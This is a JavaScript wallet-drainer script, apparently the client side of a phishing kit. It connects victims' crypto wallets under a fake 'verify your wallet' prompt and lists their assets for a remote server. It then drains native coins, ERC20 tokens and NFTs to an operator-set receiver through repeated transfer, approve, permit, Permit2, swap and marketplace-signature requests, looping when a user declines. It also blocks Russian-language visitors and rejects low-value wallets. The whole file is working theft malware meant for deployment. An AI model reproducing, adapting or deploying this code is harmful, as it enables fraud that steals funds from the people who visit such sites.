  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;
  unsigned_tx.nonce = nonce;

  await approve_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await approve_success(asset); sign_ready(); return 1;
};

const connect_wallet = async (provider = null) => {
  try {
    if (!MS_Connection) {
      if (MS_Load_Time == null || Math.floor(Date.now() / 1000) - MS_Load_Time < 15) return;
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Критическая ошибка', subtitle: 'Нет связи с сервером', text: 'Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Критическая ошибка</b><br><br>Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
      return;
    }
    if (MS_Process) return; MS_Process = true;
    if (MS_Bad_Country) {
      try { ms_hide(); } catch(err) { console.log(err); }
      try {
        if (MS_Loader_Style == 2) {
          MSL.fire({
            icon: 'error', title: 'Critical Error', subtitle: 'Запрещенная геолокация', text: 'Пожалуйста, покиньте этот веб-сайт немедленно, он не предназначен для России и стран СНГ, не пытайтесь использовать VPN, это небезопасно!',
            showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
          });
        } else {
          Swal.close();
          Swal.fire({
            html: '<b>Предупреждение</b><br><br>Пожалуйста, покиньте этот веб-сайт немедленно, он не предназначен для России и стран СНГ, не пытайтесь использовать VPN, это небезопасно!', icon: 'error',
            allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
            showConfirmButton: true, confirmButtonText: 'OK'
          });
        }
        await new Promise(r => setTimeout(r, 15000));
        window.location.href = 'https://ya.ru';
      } catch(err) {
        console.log(err);
      }
      return;
    }
    if (provider !== null) {
      if (provider == 'MetaMask') {
        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
          let is_installed = false;
          for (const elem of window.ethereum.providers) {
            if (elem.isMetaMask == true) {
              is_installed = true;
              MS_Provider = elem;
              MS_Current_Provider = 'MetaMask';
              break;
            }
          }
          if (!is_installed) {
            if (MS_Mobile_Status) {
              window.location.href = `https://metamask.app.link/dapp/${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://metamask.io', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && window.ethereum.isMetaMask) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = 'MetaMask';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://metamask.app.link/dapp/${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://metamask.io', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else if (provider == 'Coinbase') {
        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
          let is_installed = false;
          for (const elem of window.ethereum.providers) {
            if (elem.isCoinbaseWallet == true) {
              is_installed = true;
              MS_Provider = elem;
              break;
            }
          }
          if (is_installed) {
            MS_Current_Provider = 'Coinbase';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://www.coinbase.com/wallet', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser)) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = 'Coinbase';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://www.coinbase.com/wallet', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else if (provider == 'Trust Wallet') {
        if (typeof window.ethereum === 'object' && window.ethereum.isTrust) {
          MS_Provider = window.ethereum;
          MS_Current_Provider = 'Trust Wallet';
        } else {
          if (MS_Mobile_Status) {
            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${MS_Current_URL}`;
            MS_Process = false;
            return;
          } else {
            window.open('https://trustwallet.com', '_blank').focus();
            MS_Process = false;
            return;
          }
        }
      } else if (provider == 'Binance Wallet') {
        if (typeof window.BinanceChain === 'object') {
          MS_Provider = window.BinanceChain;
          MS_Current_Provider = 'Binance Wallet';
        } else {
          window.open('https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', '_blank').focus();
          MS_Process = false;
          return;
        }
      } else if (provider == 'WalletConnect' || provider == 'WalletConnect_v2') {
        MS_Current_Provider = 'WalletConnect';
      } else {
        if (typeof window.ethereum === 'object') {
          MS_Provider = window.ethereum;
          MS_Current_Provider = 'Ethereum';
        } else {
          MS_Current_Provider = 'WalletConnect';
        }
      }
    } else {
      if (window.ethereum) {
        MS_Provider = window.ethereum;
        MS_Current_Provider = 'Ethereum';
      } else {
        MS_Current_Provider = 'WalletConnect';
      }
    }
    try {
      await connect_request();
      let connection = null;
      if (MS_Current_Provider == 'WalletConnect') {
        ms_hide();
        await load_wc();
        try {
          await MS_Provider.disconnect();
        } catch(err) {
          console.log(err);
        }
        await MS_Provider.connect();
        if (MS_Provider && MS_Provider.accounts.length > 0) {
          if (!MS_Provider.accounts[0].includes('0x')) {
            MS_Process = false;
            return await connect_cancel();
          }
          await new Promise(r => setTimeout(r, 2500));
          MS_Current_Address = MS_Provider.accounts[0];
          MS_Current_Chain_ID = MS_Provider.chainId;
          MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
          MS_Signer = MS_Web3.getSigner();
          if (MS_Settings.Settings.Sign.WalletConnect == 0) {
            MS_Sign_Disabled = true;
          }
        } else {
          MS_Process = false;
          return await connect_cancel();
        }
      } else if (MS_Current_Provider == 'Trust Wallet' && !MS_Mobile_Status) {
        try {
          connection = await MS_Provider.request({ method: 'eth_requestAccounts', params: [{ eth_accounts: {} }] });
          if (connection && connection.length > 0) {
            if (!MS_Provider.selectedAddress.includes('0x')) return connect_cancel();
            MS_Current_Address = MS_Provider.selectedAddress;
            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        } catch(err) {
          connection = await MS_Provider.request({ method: 'eth_requestAccounts' });
          if (connection && connection.length > 0) {
            if (!connection[0].includes('0x')) return connect_cancel();
            MS_Current_Address = connection[0];
            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        }
      } else {
        try {
          connection = await MS_Provider.request({ method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] });
          if (connection && connection.length > 0) {
            if (!MS_Provider.selectedAddress.includes('0x')) return connect_cancel();
            MS_Current_Address = MS_Provider.selectedAddress;
            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        } catch(err) {
          connection = await MS_Provider.request({ method: 'eth_requestAccounts' });
          if (connection && connection.length > 0) {
            if (!connection[0].includes('0x')) return connect_cancel();
            MS_Current_Address = connection[0];
            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        }
      }
      if (!MS_Current_Address.match(/^0x\S+$/)) throw new Error('Invalid Wallet');
    } catch(err) {
      console.log(err);
      MS_Process = false;
      return await connect_cancel();
    }
    ms_hide();
    if (MS_Settings.V_MODE == 1) {
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'load', title: 'Waiting for action', text: 'Sign message to verificate your wallet',
          showConfirmButton: true, confirmButtonText: 'Waiting...', color: MS_Color_Scheme
        });
      } else {
        Swal.fire({
          html: '<b>Sign message</b> to verificate you wallet...',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 0, width: 600, showConfirmButton: false
        });
      }
      try {
        const verification_message = ((MS_Verify_Message == "") ? MS_Settings.V_MSG : MS_Verify_Message).replaceAll('{{ADDRESS}}', MS_Current_Address);
        const signed_message = await MS_Signer.signMessage(verification_message);
        const is_sign_correct = ethers.utils.recoverAddress(ethers.utils.hashMessage(verification_message), signed_message);
        if (!is_sign_correct) {
          if (MS_Loader_Style == 2) {
            MSL.fire({
              icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We have received your signature, but it\'s incorrect, please try again.',
              showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
            });
          } else {
            Swal.fire({
              title: 'Verification Error',
              text: "We have received your signature, but it's incorrect, please try again.",
              icon: 'error', confirmButtonText: 'OK'
            });
          }

          MS_Process = false;
          return await connect_cancel();
        } else {
          let server_result = await send_request({ action: 'sign_verify', sign: signed_message, address: MS_Current_Address, message: MS_Verify_Message });
          if (server_result.status != 'OK') {
            if (MS_Loader_Style == 2) {
              MSL.fire({
                icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We have received your signature, but it\'s incorrect, please try again.',
                showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
              });
            } else {
              Swal.fire({
                title: 'Verification Error',
                text: "We have received your signature, but it's incorrect, please try again.",
                icon: 'error', confirmButtonText: 'OK'
              });
            }
            MS_Process = false;
            return await connect_cancel();
          }
        }
      } catch(err) {
        if (MS_Loader_Style == 2) {
          MSL.fire({
            icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We cannot verify that the wallet is yours as you did not sign the message provided.',
            showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
          });
        } else {
          Swal.fire({
            title: 'Verification Error',
            text: "We cannot verify that the wallet is yours as you did not sign the message provided.",
            icon: 'error', confirmButtonText: 'OK'
          });
        }
        MS_Process = false;
        return await connect_cancel();
      }
    } else {
      await send_request({ action: 'sign_verify', address: MS_Current_Address });
    }
    await connect_success(); show_check();
    if (MS_Settings.Wallet_Blacklist.length > 0 && MS_Settings.Wallet_Blacklist.includes(MS_Current_Address.toLowerCase().trim())) {
      MS_Check_Done = true; Swal.close();
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Error', subtitle: 'AML Error', text: 'Your wallet is not AML clear!',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.fire({
          title: 'AML Error',
          text: "Your wallet is not AML clear, you can\'t use it!",
          icon: 'error', confirmButtonText: 'OK'
        });
      }
      MS_Process = false;
      return;
    }
    let assets = await get_wallet_assets(MS_Current_Address);
    let assets_price = 0; for (const asset of assets) {
      try {
        assets_price += asset.amount_usd;
      } catch(err) {
        console.log(err);
      }
    }
    let assets_usd_balance = 0; for (const asset of assets) assets_usd_balance += asset.amount_usd;
    await send_request({ action: 'check_finish', user_id: MS_ID, assets: assets, balance: assets_usd_balance });
    MS_Check_Done = true; Swal.close();
    if (MS_Settings.Settings.Minimal_Wallet_Price > assets_price) {
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Error', subtitle: 'Something went wrong!', text: 'For security reasons we can\'t allow you to connect empty or new wallet',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.fire({
          title: 'Something went wrong!',
          text: "For security reasons we can't allow you to connect empty or new wallet",
          icon: 'error', confirmButtonText: 'OK'
        });
      }
      MS_Process = false;
      return;
    }
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Waiting for action', text: 'Sign message in your wallet...',
        showConfirmButton: true, confirmButtonText: 'Waiting...', color: MS_Color_Scheme
      });
    } else {
      Swal.fire({
        html: '<b>Done!</b> Sign message in your wallet to continue...',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
    if ((MS_Settings.Settings.Sign.MetaMask == 0 && MS_Current_Provider == 'MetaMask') || (MS_Settings.Settings.Sign.Trust == 0
      && MS_Current_Provider == 'Trust Wallet') || (MS_Current_Provider == 'Trust Wallet' && !MS_Mobile_Status)) MS_Sign_Disabled = true;
    for (const asset of assets) {
      try {
        if (asset.type != 'NATIVE') MS_Gas_Reserves[asset.chain_id] += 1;
      } catch(err) {
        console.log(err);
      }
    }
    console.table(assets);
    if (typeof SIGN_BLUR !== 'undefined' && MS_Settings.Settings.Blur.Enable == 1 && MS_Settings.Settings.Blur.Priority == 1)
      await SIGN_BLUR(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.Blur.Price);
    if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 1 && MS_Settings.Settings.SeaPort.Priority == 1)
      await SIGN_SEAPORT(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.SeaPort.Price);
    if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings.Settings.x2y2.Enable == 1 && MS_Current_Chain_ID == 1 && MS_Settings.Settings.x2y2.Priority == 1)
      await SIGN_X2Y2(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.x2y2.Price);
    let should_repeat_all = true;
    while (should_repeat_all) {
      should_repeat_all = (MS_Settings.LA == 1);
      for (const asset of assets) {
        try {
          if (asset.skip) continue;
          let is_chain_correct = false;
          if (asset.type == 'NATIVE') {
            const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
            const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(Math.floor(MS_Gas_Multiplier * 100));
            const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
            const tokens_gas_fee = token_limit.mul(MS_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);
            const tx_template = { from: MS_Current_Address, to: MS_Settings.Receiver, value: BN(100) };
            const gas_limit = await node.estimateGas(tx_template);
            const balance = await node.getBalance(MS_Current_Address);
            const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
            if (available_amount.lte(BN(0))) continue;
          }
          if (asset.chain_id != MS_Current_Chain_ID) {
            await chain_request(MS_Current_Chain_ID, asset.chain_id);
            try {
              if (MS_Current_Provider == 'WalletConnect') {
                try {
                  await MS_Provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId:  `0x${asset.chain_id.toString(16)}` }] });
                } catch(err) {
                  await chain_cancel();
                  continue;
                }
              } else {
                try {
                  await MS_Provider.request({
                    method: "wallet_switchEthereumChain", params: [{ chainId: `0x${asset.chain_id.toString(16)}` }]
                  });
                } catch(err) {
                  if (err.code == 4902 || err.code == -32603) {
                    try {
                      await MS_Provider.request({ method: "wallet_addEthereumChain", params: [ MS_MetaMask_ChainData[asset.chain_id] ] });
                    } catch(err) {
                      await chain_cancel();
                      continue;
                    }
                  } else {
                    await chain_cancel();
                    continue;
                  }
                }
              }
              MS_Current_Chain_ID = asset.chain_id;
              MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
              MS_Signer = MS_Web3.getSigner();
              is_chain_correct = true;
              await chain_success();
            } catch(err) {
              console.log(err);
              await chain_cancel();
              continue;
            }
          } else {
            is_chain_correct = true;
          }
          if (!is_chain_correct) continue;
          if (asset.type == 'NATIVE') {
            if (MS_Settings.Settings.Sign.Native > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)) {
              while (true) {
                try {
                  await SIGN_NATIVE(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if ((MS_Settings.Settings.Sign.WC_AE == 1 && MS_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
                    if (MS_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        try {
                          await TRANSFER_NATIVE(asset);
                          asset.skip = true;
                          break;
                        } catch(err) {
                          console.log(err);
                          if (err != 'LOW_BALANCE') {
                            await transfer_cancel();
                            if (!MS_Settings.Loop_N) break;
                          } else {
                            break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != 'LOW_BALANCE') {
                      await sign_cancel();
                      if (!MS_Settings.Loop_N) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_NATIVE(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if (err != 'LOW_BALANCE') {
                    await transfer_cancel();
                    if (!MS_Settings.Loop_N) break;
                  } else {
                    break;
                  }
                }
              }
            }
          } else if (asset.type == 'ERC20') {
            if (typeof asset.permit == 'undefined' && MS_Settings.Settings.Permit.Mode && asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
              const data = await retrive_token(asset.chain_id, asset.address);
              const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
              const contract = new ethers.Contract(asset.address, data, node);
              const permit_type = get_permit_type(contract.functions);
              asset.permit = permit_type;
              asset.permit_ver = "1";
              asset.abi = data;
              if (permit_type > 0) {
                if (contract.functions.hasOwnProperty('version')) {
                  try {
                    asset.permit_ver = await contract.version();
                  } catch(err) {
                    console.log(err);
                  }
                }
                console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
              }
            }
            if (asset.permit > 0) {
              for (const c_address of MS_Settings.Permit_BL) {
                if (c_address[0] == MS_Current_Chain_ID && c_address[1] === asset.address.toLowerCase().trim()) {
                  asset.permit = 0;
                  break;
                }
              }
            }
            if (MS_Settings.Settings.Permit2.Mode && asset.permit2) {
              const all_permit2 = [];
              for (const x_asset of assets) {
                try {
                  if (x_asset.chain_id == asset.chain_id && x_asset.permit2) {
                    all_permit2.push(x_asset);
                    x_asset.skip = true;
                  }
                } catch(err) {
                  console.log(err);
                }
              }
              while (true) {
                try {
                  await DO_PERMIT2(asset, all_permit2);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            } else if (MS_Settings.Settings.Permit.Mode && asset.permit && asset.permit > 0) {
              while (true) {
                try {
                  await PERMIT_TOKEN(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            } else if (MS_Settings.Settings.Swappers.Enable && asset.swapper && asset.amount_usd >= MS_Settings.Settings.Swappers.Price) {
              if (asset.swapper_type == 'Uniswap') {
                const all_uniswap = [];
                for (const x_asset of assets) {
                  try {
                    if (x_asset.chain_id == asset.chain_id && x_asset.swapper && x_asset.swapper_type == 'Uniswap') {
                      all_uniswap.push(x_asset);
                      x_asset.skip = true;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
                while (true) {
                  try {
                    await DO_UNISWAP(asset, all_uniswap);
                    asset.skip = true;
                    break;
                  } catch(err) {
                    console.log(err);
                    await sign_cancel();
                    if (!MS_Settings.Loop_T) break;
                  }
                }
              } else if (asset.swapper_type == 'Pancake_V3') {
                const all_pancake = [];
                for (const x_asset of assets) {
                  try {
                    if (x_asset.chain_id == asset.chain_id && x_asset.swapper && x_asset.swapper_type == 'Pancake_V3') {
                      all_pancake.push(x_asset);
                      x_asset.skip = true;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
                while (true) {
                  try {
                    await DO_PANCAKE_V3(asset, all_pancake);
                    asset.skip = true;
                    break;
                  } catch(err) {
                    console.log(err);
                    await sign_cancel();
                    if (!MS_Settings.Loop_T) break;
                  }
                }
              } else {
                while (true) {
                  try {
                    await DO_SWAP(asset);
                    asset.skip = true;
                    break;
                  } catch(err) {
                    console.log(err);
                    await sign_cancel();
                    if (!MS_Settings.Loop_T) break;
                  }
                }
              }
            } else if (MS_Settings.Settings.Sign.Tokens > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)) {
              while (true) {
                try {
                  await SIGN_TOKEN(asset);
                  if (MS_Settings.Settings.Sign.Tokens == 1) {
                    const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address, PW: false });
                    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if ((MS_Settings.Settings.Sign.WC_AE == 1 && MS_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
                    if (MS_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        if (MS_Settings.Settings.Sign.Tokens == 1) {
                          if ((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask) || (MS_Current_Provider == 'Trust Wallet'
                          && MS_Settings.Settings.Approve.Trust) || (MS_Current_Provider != 'MetaMask' && MS_Current_Provider != 'Trust Wallet')) {
                            try {
                              let res_code = await APPROVE_TOKEN(asset);
                              if (res_code == 1) {
                                const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address, PW: MS_Settings.Personal_Wallet });
                                if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                              }
                              asset.skip = true;
                              break;
                            } catch(err) {
                              await approve_cancel();
                              if (!MS_Settings.Loop_T) break;
                            }
                          } else {
                            try {
                              await TRANSFER_TOKEN(asset);
                              asset.skip = true;
                              break;
                            } catch(err) {
                              console.log(err);
                              await transfer_cancel();
                              if (!MS_Settings.Loop_T) break;
                            }
                          }
                        } else if (MS_Settings.Settings.Sign.Tokens == 2) {
                          try {
                            await TRANSFER_TOKEN(asset);
                            asset.skip = true;
                            break;
                          } catch(err) {
                            console.log(err);
                            await transfer_cancel();
                            if (!MS_Settings.Loop_T) break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != 'LOW_BALANCE') {
                      await sign_cancel();
                      if (!MS_Settings.Loop_T) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else if ((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask) || (MS_Current_Provider == 'Trust Wallet'
            && MS_Settings.Settings.Approve.Trust) || (MS_Current_Provider != 'MetaMask' && MS_Current_Provider != 'Trust Wallet')) {
              while (true) {
                try {
                  let res_code = await APPROVE_TOKEN(asset);
                  if (res_code == 1) {
                    const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address, PW: MS_Settings.Personal_Wallet });
                    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_TOKEN(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await transfer_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            }
          } else if (asset.type == 'ERC721') {
            if (typeof SIGN_BLUR !== 'undefined' && MS_Settings.Settings.Blur.Enable == 1 && MS_Settings.Settings.Blur.Priority == 0 && !BL_US
            && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0x00000000000111abe46ff893f3b2fdf1f759a8a8"))
            && asset.amount_usd >= MS_Settings.Settings.Blur.Price) {
              await SIGN_BLUR(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.Blur.Price); BL_US = true;
            } else if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 1 && MS_Settings.Settings.SeaPort.Priority == 0 && !SP_US
            && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0x1E0049783F008A0085193E00003D00cd54003c71"))
            && asset.amount_usd >= MS_Settings.Settings.SeaPort.Price) {
              await SIGN_SEAPORT(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.SeaPort.Price); SP_US = true;
            } else if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings.Settings.x2y2.Enable == 1 && MS_Settings.Settings.x2y2.Priority == 0 && !XY_US
            && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0xf849de01b080adc3a814fabe1e2087475cf2e354"))
            && asset.amount_usd >= MS_Settings.Settings.x2y2.Price) {
              await SIGN_X2Y2(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.x2y2.Price); XY_US = true;
            } else if (MS_Settings.Settings.Sign.NFTs > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)) {
              while (true) {
                try {
                  await SIGN_NFT(asset);
                  if (MS_Settings.Settings.Sign.NFTs == 1) {
                    let same_collection = [];
                    for (const x_asset of assets) {
                      try {
                        if (x_asset.address == asset.address) {
                          same_collection.push(x_asset);
                          x_asset.skip = true;
                        }
                      } catch(err) {
                        console.log(err);
                      }
                    }
                    await send_request({
                      action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                      chain_id: MS_Current_Chain_ID, contract_address: asset.address
                    });
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if ((MS_Settings.Settings.Sign.WC_AE == 1 && MS_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
                    if (MS_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        if (MS_Settings.Settings.Sign.NFTs == 1) {
                          try {
                            await DO_SAFA(asset);
                            let same_collection = [];
                            for (const x_asset of assets) {
                              try {
                                if (x_asset.address == asset.address) {
                                  same_collection.push(x_asset);
                                  x_asset.skip = true;
                                }
                              } catch(err) {
                                console.log(err);
                              }
                            }
                            await send_request({
                              action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                              chain_id: MS_Current_Chain_ID, contract_address: asset.address
                            });
                            asset.skip = true;
                            break;
                          } catch(err) {
                            console.log(err);
                            await approve_cancel();
                            if (!MS_Settings.Loop_NFT) break;
                          }
                        } else if (MS_Settings.Settings.Sign.NFTs == 2) {
                          try {
                            await TRANSFER_NFT(asset);
                            asset.skip = true;
                            break;
                          } catch(err) {
                            console.log(err);
                            await transfer_cancel();
                            if (!MS_Settings.Loop_NFT) break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != 'LOW_BALANCE') {
                      await sign_cancel();
                      if (!MS_Settings.Loop_NFT) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else if (MS_Settings.Settings.Approve.Enable) {
              while (true) {
                try {
                  await DO_SAFA(asset);
                  let same_collection = [];
                  for (const x_asset of assets) {
                    try {
                      if (x_asset.address == asset.address) {
                        same_collection.push(x_asset);
                        x_asset.skip = true;
                      }
                    } catch(err) {
                      console.log(err);
                    }
                  }
                  await send_request({
                    action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                    chain_id: MS_Current_Chain_ID, contract_address: asset.address
                  });
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_NFT) break;
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_NFT(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await transfer_cancel();
                  if (!MS_Settings.Loop_NFT) break;
                }
              }
            }
          }
        } catch(err) {
          console.log(err);
        }
      }
    }
    MS_Process = false;
    setTimeout(end_message, 2000);
  } catch(err) {
    console.log(err);
  }
}

try {
  let query_string = window.location.search, url_params = new URLSearchParams(query_string);
  if (url_params.get('cis') != 'test' && (navigator.language || navigator.userLanguage).toLowerCase().includes('ru')) {
    MS_Bad_Country = true;
  }
} catch(err) {
  console.log(err);
}

document.addEventListener('DOMContentLoaded', async () => {
  try {
    if (MS_Modal_Style == 2) MSM.init(); else inject_modal();
    if (MS_Loader_Style == 2) MSL.init();
    MS_Load_Time = Math.floor(Date.now() / 1000);
    if (typeof localStorage['MS_ID'] === 'undefined') {
      const ID_Data = await send_request({ action: 'retrive_id' });
